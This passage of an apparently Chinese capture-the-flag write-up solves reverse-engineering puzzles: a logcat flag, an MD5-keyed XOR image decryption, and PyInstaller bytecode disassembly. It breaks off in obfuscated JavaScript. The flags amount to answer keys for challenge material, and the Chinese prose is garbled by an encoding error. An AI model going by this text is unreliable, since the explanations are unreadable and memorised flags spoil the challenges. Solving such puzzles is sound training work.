class="number">4L</span>L, <span class="string">&quot;xilo&quot;</span>, <span class="string">&quot;flag&#123;%s&#125;&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰é“ç†è¯´æŠŠå­—ç¬¦ä¸²md5ä¹‹åå°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œä½†æ˜¯å¤±è´¥äº†</p><p>çœ‹åˆ°logå­—æ ·ï¼Œç›´æ¥æŸ¥æ—¥å¿—</p><ul><li>æ¨¡æ‹Ÿå™¨å¼€å¯å¼€å‘è€…é€‰é¡¹</li><li>adb devicesç¡®è®¤è¿æ¥æˆåŠŸ</li><li>è¾“å…¥<code>adb logcat -v time&gt;D:log.txt</code>å¼€å§‹æŠ“å–æ—¥å¿—ï¼ŒæœŸé—´æ‰“å¼€è½¯ä»¶ç‚¹å‡»æŒ‰é’®ç”Ÿæˆflag</li><li>ç„¶åè¿”å›å‘½ä»¤è¡ŒCtrl+Cå®ŒæˆæŠ“å–</li><li>æ‰¾åˆ°log.txtæŸ¥çœ‹æ—¥å¿—<del>ï¼ˆè™½ç„¶å‘½ä»¤å†™çš„åœ¨Dç›˜ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯åœ¨å½“å‰ç›®å½•ï¼‰</del></li></ul><p><code>flag&#123;4724110e8c8a83c123d6df82efee8c53&#125;</code></p><h2 id="picchange"><a href="#picchange" class="headerlink" title="picchange"></a>picchange</h2><p><code>è¾“å…¥æ•°å­—å³å¯å¾—åˆ°flagå“¦</code></p><p>ä¸€å¼€å§‹æƒ³çš„æ˜¯ç›´æ¥æ‰”è¿›idaåç¼–è¯‘ç„¶åçœ‹å¯¹å›¾åƒçš„åŠ å¯†é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_7FF6B8023C20</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *Stream; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  FILE *Streama; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">void</span> *Buffer; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  sub_7FF6B80213C0(&amp;unk_7FF6B8036017);</span><br><span class="line">  Stream = fopen(a1, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v4 = ftell(Stream);</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Buffer = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    <span class="keyword">if</span> ( Buffer )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(Buffer, <span class="number">1u</span>i64, v4, Stream);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">        *((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br><span class="line">      Streama = fopen(<span class="string">&quot;picc_xor.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( Streama )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(Buffer, <span class="number">1u</span>i64, v4, Streama);</span><br><span class="line">        fclose(Streama);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">        sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        perror(&amp;byte_7FF6B802CFA8);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(&amp;byte_7FF6B802CF80);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(&amp;ErrMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯å¯¹å›¾åƒæ–‡ä»¶çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½è¿›è¡Œäº†å¼‚æˆ–è¿ç®—ï¼Œä½†æ˜¯å¼‚æˆ–çš„å¯¹è±¡æ˜¯ä¸ç¡®å®šçš„<br>åœ¨äº¤å‰å¼•ç”¨åˆ°æœ€åŸå§‹çš„å˜é‡ä»¥åŠåŠ¨æ€è°ƒè¯•ä¹‹åå¾—å‡ºç»“è®ºï¼šä½¿ç”¨çš„æ˜¯è¾“å…¥çš„ä¸‰ä½æ•°å­—çš„md5å€¼ä½œä¸ºkeyï¼Œå¯¹å›¾åƒæ–‡ä»¶è¿›è¡Œå¾ªç¯å¼‚æˆ–çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Stack[00001C64]:0000003589DCF5A8 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5A9 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5AA db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5AB db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5AC db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5AD db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5AE db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5AF db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5B0 db  61h ; a</span><br><span class="line">Stack[00001C64]:0000003589DCF5B1 db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5B2 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B3 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B4 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5B5 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5B6 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B7 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5B8 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B9 db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5BA db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5BB db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5BC db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5BD db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5BE db  31h ; 1</span><br><span class="line">Stack[00001C64]:0000003589DCF5BF db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5C0 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C1 db  64h ; d</span><br><span class="line">Stack[00001C64]:0000003589DCF5C2 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C3 db  33h ; 3</span><br><span class="line">Stack[00001C64]:0000003589DCF5C4 db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5C5 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5C6 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5C7 db  30h ; 0</span><br></pre></td></tr></table></figure><p>è¿™æ®µæ•°æ®å°±æ˜¯è¾“å…¥çš„æµ‹è¯•æ•°æ®<code>123</code>å¯¹åº”çš„md5å€¼ï¼Œè€Œä¸ºäº†è§£å¯†å›¾åƒï¼Œè¾“å…¥çš„keyéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¯·è¾“å…¥ä½ çš„keyï¼š 123</span><br><span class="line">MD5 çš„å‰ä¸‰ä½æ•°å­—ä¸ keyçš„æœ¬èº«å€¼ ä¸ç›¸ç­‰ã€‚æ³¨:æ•°å­—èŒƒå›´ä¸º0--9</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸»è¦æ˜¯<code>æ•°å­—èŒƒå›´ä¸º0--9</code>æŒ‡çš„æ˜¯è¾“å…¥çš„keyè¿˜æ˜¯md5çš„å€¼ï¼Œè¿˜æ˜¯ä¸¤è€…çš†æ˜¯<br>ç­”æ¡ˆæ˜¯åªæœ‰è¾“å…¥çš„keyï¼Œå› ä¸ºä½œä¸ºå¾ªç¯å¼‚æˆ–çš„å¯¹è±¡é•¿åº¦åº”è¯¥æ˜¯ä¸€å®šçš„ï¼Œè€Œå¦‚æœè½¬æ¢ä¸ºåè¿›åˆ¶çš„è¯åŸæœ¬çš„md5ç¼–ç çš„é•¿åº¦å¯èƒ½ä¼šå˜åŒ–ï¼Œè¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥åœ¨å…ˆå‰å¯¹å›¾åƒåŠ å¯†çš„ä»£ç ä¸­å¾—å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯ä»¥32ä¸ºå‘¨æœŸçš„</p><p>æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯æ‰¾åˆ°æŸä¸‰ä½æ•°å­—ï¼Œå…¶md5çš„å€¼çš„å‰ä¸‰ä½ä¸åŸæœ¬çš„å€¼æ˜¯ç›¸ç­‰çš„</p><p>ç”Ÿæˆæ­£ç¡®çš„key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            num = <span class="string">f&quot;<span class="subst">&#123;i*<span class="number">100</span>+j*<span class="number">10</span>+k:<span class="number">03</span>d&#125;</span>&quot;</span></span><br><span class="line">            c = hashlib.md5(num.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">            print(num, <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(num) == <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">                print(num)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä½¿ç”¨pythonå®ç°md5ç¼–ç è¿˜æœ‰ä¸€ç§å…ˆupdateå†hexdigestçš„æ–¹æ³•ï¼Œé‚£ç§æ–¹æ³•åœ¨è¿™é‡Œæ˜¯è¡Œä¸é€šçš„<br><code>320</code><br>ç„¶åå°†keyä½œä¸ºè¾“å…¥å°±å¯ä»¥å¾—åˆ°è§£å¯†åçš„å›¾ç‰‡äº†</p><p><code>flag&#123;pic_pic_is_so_easy!&#125;</code></p><h2 id="Ro1ling"><a href="#Ro1ling" class="headerlink" title="Ro1ling~"></a>Ro1ling~</h2><p>é¢˜ç›®æè¿°</p><ol><li>flag is rolling ~ flag is flying ~</li><li>press <code>q</code> to quit</li><li>tips: The flag format is <code>XSCTF\&#123;[ -~]+\&#125;</code></li></ol><p>è¿è¡Œç¨‹åºï¼Œä¼šå‡ºç°å¼¹å¹•ä¸€æ ·é£˜è¿‡çš„æ–‡å­—<br>ä½†æ˜¯ï¼Œåœ¨ä¸­æ­¢è¿è¡Œæ—¶å‡ºç°äº†è¿™æ ·çš„æŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">97</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;curses\__init__.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> main</span><br><span class="line">KeyboardInterrupt</span><br><span class="line">[<span class="number">21964</span>] Failed to execute script <span class="string">&#x27;Ro1ling&#x27;</span> due to unhandled exception!</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„Tracebackï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥æ˜¯python</p><p>æ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨pythonç¼–å†™å¹¶æ‰“åŒ…çš„exeæ–‡ä»¶<br>èƒ½æ‰“åŒ…pythonçš„å·¥å…·ä¸»è¦æœ‰<code>pyinstaller</code>ç­‰ï¼Œè¿™é‡Œä½¿ç”¨å¯¹åº”çš„<code>pyinstxtractor</code>åç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Ro1ling.exe</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»¥ä¸Šå‘½ä»¤ä¹‹åå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­æœ‰åŒåçš„pycæ–‡ä»¶<br>ä½¿ç”¨<code>uncompyle6</code>å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpyæ–‡ä»¶<br>ä½†æ˜¯æŠ¥é”™äº†<br>ä½¿ç”¨åœ¨çº¿ç½‘ç«™çš„ç»“æœä¹Ÿæ˜¯ä¸å®Œæ•´çš„</p><p>ä¸Šç½‘æŸ¥è¯¢ä¹‹åæ‰¾åˆ°è¿™ä¹ˆä¸€ç¯‡åšå®¢<br><a href="https://www.cnblogs.com/czlnb/p/16246759.html">pythoné€†å‘å®æˆ˜ï¼šåç¼–è¯‘python3 pycæ–‡ä»¶ - ä¹˜èˆŸå‡‰ - åšå®¢å›­ (cnblogs.com)</a></p><p>é‡Œè¾¹æœ‰æ‰‹åŠ¨æå–opcodeçš„ç¤ºä¾‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> uncompyle6.main <span class="keyword">import</span> decompile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># version = (3, 8, 0)</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sub_codeObject_list</span>(<span class="params">co</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [ins <span class="keyword">for</span> ins <span class="keyword">in</span> <span class="built_in">list</span>(dis.Bytecode(co)) <span class="keyword">if</span> <span class="string">&quot;code object&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(ins.argval)]</span><br><span class="line"></span><br><span class="line">outstream = sys.stdout</span><br><span class="line">showasm = <span class="literal">None</span></span><br><span class="line">showast = <span class="literal">False</span></span><br><span class="line">showgrammar = <span class="literal">False</span></span><br><span class="line">source_encoding = <span class="literal">None</span></span><br><span class="line">mapstream = <span class="literal">None</span></span><br><span class="line">do_fragments = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xdis <span class="keyword">import</span> load_module</span><br><span class="line">filename = <span class="string">&quot;Ro1ling.pyc&quot;</span></span><br><span class="line">code_objects = &#123;&#125;</span><br><span class="line">(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module(</span><br><span class="line">    filename, code_objects</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompile_part</span>(<span class="params">co,father_name=<span class="literal">None</span>,outstream=sys.stdout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> father_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            name = <span class="string">&quot;%s.%s&quot;</span> % (father_name,co.co_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = co.co_name</span><br><span class="line">        outstream.write(<span class="string">&quot;\n# %s ____________________________________________\n&quot;</span> % name)</span><br><span class="line">        decompile(</span><br><span class="line">            version,</span><br><span class="line">            co,</span><br><span class="line">            outstream,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            timestamp,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            code_objects=&#123;&#125;,</span><br><span class="line">            source_size=source_size,</span><br><span class="line">            is_pypy=<span class="literal">False</span>,</span><br><span class="line">            magic_int=magic_int,</span><br><span class="line">            mapstream=<span class="literal">None</span>,</span><br><span class="line">            do_fragments=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bytecode = get_sub_codeObject_list(co)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> bytecode:</span><br><span class="line">            co = code.argval</span><br><span class="line">            decompile_part(co,name,outstream)</span><br><span class="line">decompile_part(co)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="comment">#æ”¹å˜æ ‡å‡†è¾“å‡ºçš„é»˜è®¤ç¼–ç </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        byteCode = fp.read()[<span class="number">16</span>:]</span><br><span class="line">   </span><br><span class="line">    co  = marshal.loads(byteCode)</span><br><span class="line">    dis.dis(co)</span><br></pre></td></tr></table></figure><p>å…ˆè¿è¡Œç¬¬ä¸€ä»½ä»£ç ï¼Œå†è¿è¡Œç¬¬äºŒä»½ä»£ç ï¼Œå°±å¯ä»¥å¾—åˆ°opcodeçš„è¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> 28          72 BUILD_LIST               0</span><br><span class="line">             74 LOAD_CONST               6 ((<span class="string">&#x27;Summer in the hills&#x27;</span>, <span class="string">&#x27;Those hazy days I do remember&#x27;</span>, <span class="string">&#x27;We were running still&#x27;</span>, <span class="string">&#x27;Had the whole world at our feet&#x27;</span>, <span class="string">&#x27;Watching seasons change&#x27;</span>, <span class="string">&#x27;Our roads were lined with adventure&#x27;</span>, <span class="string">&#x27;Mountains in the way&#x27;</span>, <span class="string">&quot;Couldn&#x27;t keep us from the sea&quot;</span>, <span class="string">&#x27;Here we stand open arms&#x27;</span>, <span class="string">&#x27;This is home where we are&#x27;</span>, <span class="string">&#x27;Ever strong in the world that we made&#x27;</span>, <span class="string">&#x27;I still hear you in the breeze&#x27;</span>, <span class="string">&#x27;See your shadows in the trees&#x27;</span>, <span class="string">&#x27;Holding on, memories never change&#x27;</span>))</span><br><span class="line">             76 CALL_FINALLY             1 (to 79)</span><br><span class="line">             78 STORE_DEREF              2 (phrases)</span><br><span class="line"></span><br><span class="line"> 29          80 LOAD_CONST               7 (<span class="string">&#x27;ğ™“ğ™ğ˜¾ğ™ğ™&#123;ğ™0ğ™§_0ğ™£ğ™˜3_ğ™®0ğ™ª_ğ™4ğ™«3_7ğ™–57ğ™šğ™™_ğ™›ğ™¡ğ™ğ™œ                    ğ™ğ™©_ğ™®0ğ™ª_ğ™¬1ğ™¡ğ™¡_ï¿½</span></span><br><span class="line"><span class="string">44ğ™¡ğ™ _7ğ™3_3ğ™–ğ™§7ğ™_ğ™¬17ğ™_ğ™®0ğ™ªğ™§_3ğ™®35_7ğ™ªğ™§ğ™£3ğ™™_5ğ™ ğ™®ğ™¬4ğ™§ğ™™5&#125;&#x27;</span>)</span><br><span class="line">             82 STORE_DEREF              3 (secret_message)</span><br><span class="line"></span><br><span class="line"> 46          84 LOAD_DEREF               4 (stdscr)</span><br><span class="line">        &gt;&gt;   86 LOAD_METHOD              7 (nodelay)</span><br><span class="line">             88 LOAD_CONST               8 (True)</span><br><span class="line">             90 CALL_METHOD              1</span><br><span class="line">             92 POP_TOP</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å› ä¸ºå‘½ä»¤è¡Œçš„ç¼–ç åŸå› è¿™é‡Œçš„flagå…¶å®æ˜¯ä¹±ç ï¼ˆå› æ­¤æˆ‘è¿˜åˆ†æäº†ä¸€ä¸‹opcodeæœ‰æ²¡æœ‰åŠ å¯†çš„è¿‡ç¨‹ï¼Œäº‹å®è¯æ˜æ²¡æœ‰ï¼‰<br>ä½†æ˜¯opcodeè½¬æ¢ä¸ºpyä»£ç çš„æ–¹å¼æ²¡æœ‰æ‰¾åˆ°</p><p>åœ¨å¤åˆ¶åˆ°å…¶ä»–æ–‡æœ¬ç¼–è¾‘å™¨ä¹‹åå°±å¯ä»¥çœ‹åˆ°flagäº†ï¼ˆè¦æ‰‹æ‰“ï¼Œå› ä¸ºæ ¼å¼å†™äº†åªæ”¯æŒasciiç¼–ç çš„å­—ç¬¦ï¼Œè¿™é‡Œæ˜¯unicodeï¼‰</p><p><code>XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;</code><br><del>è¿™flagçœŸé•¿å•Š</del></p><h2 id="Running"><a href="#Running" class="headerlink" title="Running~"></a>Running~</h2><p>ä¸€ä¸ªæ²¡æœ‰åç¼€çš„æ–‡ä»¶ï¼Œå†…å®¹æ˜¯jsä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x21b6c9=_0xe50d;<span class="function"><span class="keyword">function</span> <span class="title">_0xe50d</span>(<span class="params">_0x483c4e,_0x3bb3e1</span>)</span>&#123;<span class="keyword">var</span> _0x1173b4=_0x1173();<span class="keyword">return</span> _0xe50d=<span class="function"><span class="keyword">function</span>(<span class="params">_0xe50d90,_0x1a4c11</span>)</span>&#123;_0xe50d90=_0xe50d90-<span class="number">0x105</span>;<span class="keyword">var</span> _0x33ff31=_0x1173b4[_0xe50d90];<span class="keyword">return</span> _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;<span class="function"><span class="keyword">function</span> <span class="title">_0x1173</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2badaa=[<span class="string">&#x27;920aGutvi&#x27;</span>,<span class="string">&#x27;517wlRFdu&#x27;</span>,<span class="string">&#x27;221112hjXCvb&#x27;</span>,<span class="string">&#x27;169436bqkkfr&#x27;</span>,<span class="string">&#x27;8dhAXCJ&#x27;</span>,<span class="string">&#x27;12838203EfwKcG&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span 